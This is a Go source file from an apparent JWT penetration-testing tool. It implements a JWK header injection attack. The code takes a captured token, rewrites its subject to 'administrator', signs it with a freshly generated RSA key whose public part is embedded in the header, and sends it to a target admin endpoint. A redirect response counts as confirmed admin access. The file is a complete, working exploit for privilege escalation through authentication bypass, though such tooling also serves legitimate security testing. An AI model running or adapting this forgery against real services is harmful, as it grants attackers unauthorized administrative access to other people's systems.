package jwt

import (
	"crypto/rand"
	"crypto/rsa"
	"encoding/base64"

	jwtlib "github.com/golang-jwt/jwt/v5"

	"github.com/spencer5cent/jwtknife/internal/httpx"
	"github.com/spencer5cent/jwtknife/internal/report"
)

type JWKHeaderAttack struct{}

func NewJWKHeaderAttack() *JWKHeaderAttack {
	return &JWKHeaderAttack{}
}

func (a *JWKHeaderAttack) Name() string {
	return "jwk-header-injection"
}

func (a *JWKHeaderAttack) Run(in AttackInput) report.AttackResult {
	res := report.NewAttackResult(a.Name())
	res.Outcome = report.OutcomeNoEffect

	// Parse original token without verification
	parser := jwtlib.NewParser(jwtlib.WithoutClaimsValidation())
	tok, _, err := parser.ParseUnverified(in.RawJWT, jwtlib.MapClaims{})
	if err != nil {
		res.Outcome = report.OutcomeError
		res.Errors = append(res.Errors, err.Error())
		return res
	}

	claims, ok := tok.Claims.(jwtlib.MapClaims)
	if !ok {
		res.Outcome = report.OutcomeError
		res.Errors = append(res.Errors, "claims not MapClaims")
		return res
	}

	// Privilege escalation (generic)
	claims["sub"] = "administrator"

	// Generate RSA keypair
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		res.Outcome = report.OutcomeError
		res.Errors = append(res.Errors, err.Error())
		return res
	}

	// Embedded JWK
	jwk := map[string]any{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(priv.PublicKey.N.Bytes()),
		"e":   "AQAB",
	}

	// Forge token
	newTok := jwtlib.NewWithClaims(jwtlib.SigningMethodRS256, claims)
	newTok.Header["jwk"] = jwk

	forged, err := newTok.SignedString(priv)
	if err != nil {
		res.Outcome = report.OutcomeError
		res.Errors = append(res.Errors, err.Error())
		return res
	}

	// Send forged admin request
	adminRes := in.Client.Do(httpx.RequestPlan{
		Label:     "admin-jwk",
		URL:       in.Targets.AdminURL,
		Method:    in.Targets.Method,
		JWT:       forged,
		Placement: in.Targets.Placement,
	})

	res.Steps = append(res.Steps, report.Step{
		Label: "forged-jwk-jwt",
		JWT:   report.JWTInfo{Token: forged},
		HTTP:  report.FromHTTPResult(adminRes),
	})

	// SUCCESS heuristic: admin endpoints redirect on success
	if adminRes.Status == 302 {
		res.Outcome = report.OutcomeSuccess
		res.Note = "Admin access confirmed via JWK header injection"
		return res
	}

	res.Outcome = report.OutcomeInteresting
	res.Note = "Forged JWT with embedded JWK header (no admin access)"

	return res
}
